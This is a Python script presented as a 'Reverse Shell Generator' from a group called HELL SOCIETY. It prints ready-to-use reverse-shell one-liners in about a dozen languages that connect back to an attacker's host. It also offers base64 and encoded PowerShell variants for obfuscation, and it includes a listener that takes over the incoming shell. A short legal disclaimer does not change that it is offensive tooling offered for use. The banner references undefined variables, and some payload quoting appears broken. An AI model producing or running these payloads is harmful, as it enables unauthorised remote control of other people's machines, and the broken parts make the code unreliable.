#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  REVERSE SHELL GENERATOR v2.0                                    ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Post-Exploitation                         ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import sys
import os
import colorama
from colorama import Fore, Back, Style
import argparse
import socket
import subprocess
import threading

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

PAYLOADS = {
    'bash': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    'bash_base64': 'echo {payload} | base64 -d | bash',
    'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    'python3_import': '''python3 -c '
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
' ''',
    'perl': 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    'php': 'php -r \\'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\\'',
    'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    'java': 'Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}}); p.waitFor();',
    'netcat': 'nc -e /bin/sh {host} {port}',
    'netcat_gaping': 'nc -c /bin/sh {host} {port}',
    'powershell': '$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
    'powershell_encode': 'powershell -e {encoded}',
    'nodejs': 'require("child_process").exec("bash -c \'bash -i >& /dev/tcp/{host}/{port} 0>&1\'")',
    'golang': 'echo \'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/shell.go && go run /tmp/shell.go',
    'socat': 'socat tcp-connect:{host}:{port} exec:bash,pty,stderr,setsid,sigint,sane',
    'awk': 'awk \'BEGIN {{s = "/inet/tcp/0/{host}/{port}"; while(1) {{do {{ printf "shell>" |& s; s |& getline c; if(c) {{ while ((c |& getline) > 0) print $0 |& s; close(c) }} }} while(c != "exit") close(s)}}}}\' /dev/null',
}

class ReverseShellGenerator:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def generate(self, payload_type=None):
        print(f"{Fore.CYAN}  {'═' * 60}")
        print(f"{Fore.CYAN}  REVERSE SHELL PAYLOADS")
        print(f"{Fore.CYAN}  {'═' * 60}\n")
        print(f"  {Fore.WHITE}LHOST: {Fore.GREEN}{self.host}")
        print(f"  {Fore.WHITE}LPORT: {Fore.GREEN}{self.port}")
        print(f"  {Fore.CYAN}  {'─' * 60}\n")

        types_to_show = [payload_type] if payload_type else list(PAYLOADS.keys())

        for ptype in types_to_show:
            if ptype not in PAYLOADS:
                continue

            payload_template = PAYLOADS[ptype]
            payload = payload_template.format(host=self.host, port=self.port)

            if ptype == 'bash_base64':
                original = PAYLOADS['bash'].format(host=self.host, port=self.port)
                import base64
                encoded = base64.b64encode(original.encode()).decode()
                payload = f"echo {encoded} | base64 -d | bash"

            if ptype == 'powershell_encode':
                import base64
                ps_payload = PAYLOADS['powershell'].format(host=self.host, port=self.port)
                encoded = base64.b64encode(ps_payload.encode('utf-16-le')).decode()
                payload = f"powershell -e {encoded}"

            color = Fore.GREEN if ptype in ['bash', 'python', 'netcat'] else Fore.YELLOW
            print(f"  {color}[{ptype.upper()}]")
            print(f"  {Fore.WHITE}{payload}")

            import base64
            b64 = base64.b64encode(payload.encode()).decode()
            print(f"  {Fore.CYAN}Base64: {b64[:80]}...")
            print(f"  {Fore.CYAN}  {'─' * 60}\n")

    def listener(self):
        print(f"{Fore.CYAN}  [*] Starting listener on {self.host}:{self.port}...\n")

        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', self.port))
            server.listen(1)
            print(f"  {Fore.GREEN}[+] Listening on port {self.port}...")

            conn, addr = server.accept()
            print(f"  {Fore.GREEN}[+] Connection from: {addr[0]}:{addr[1]}")
            print(f"\n{Fore.RED}  [*] Shell opened! Type commands:\n")

            while True:
                try:
                    cmd = input(f"{Fore.RED}shell> {Fore.WHITE}")
                    if cmd == 'exit':
                        break
                    conn.send(cmd.encode() + b'\n')
                    data = conn.recv(4096).decode('utf-8', errors='ignore')
                    print(data)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"{Fore.RED}  [!] Connection lost: {e}")
                    break

            conn.close()
            server.close()
            print(f"\n{Fore.CYAN}  [+] Shell closed")

        except Exception as e:
            print(f"{Fore.RED}  [!] Error: {e}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society Reverse Shell Generator')
    parser.add_argument('-l', '--host', required=True, help='Listener host (your IP)')
    parser.add_argument('-p', '--port', type=int, required=True, help='Listener port')
    parser.add_argument('--type', help='Specific payload type')
    parser.add_argument('--listen', action='store_true', help='Start listener')
    args = parser.parse_args()

    generator = ReverseShellGenerator(args.host, args.port)

    if args.listen:
        generator.listener()
    else:
        generator.generate(args.type)

if __name__ == "__main__":
    main()
